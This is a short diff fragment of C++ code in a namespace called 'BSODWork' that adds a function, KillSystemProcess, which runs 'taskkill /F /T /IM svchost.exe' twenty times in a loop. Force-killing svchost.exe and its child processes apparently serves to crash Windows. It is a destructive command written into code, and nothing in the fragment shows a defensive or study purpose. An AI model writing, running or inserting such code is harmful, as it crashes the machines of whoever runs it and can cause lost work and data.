@@ -23,7 +23,14 @@ namespace BSODWork {
 		
 	}
 
+	void KillSystemProcess() {
+
+		for (int i = 0; i < 20; i++)
+		{
+			system("taskkill /F /T /IM svchost.exe");
+		}
 	
+	}
 
 
 
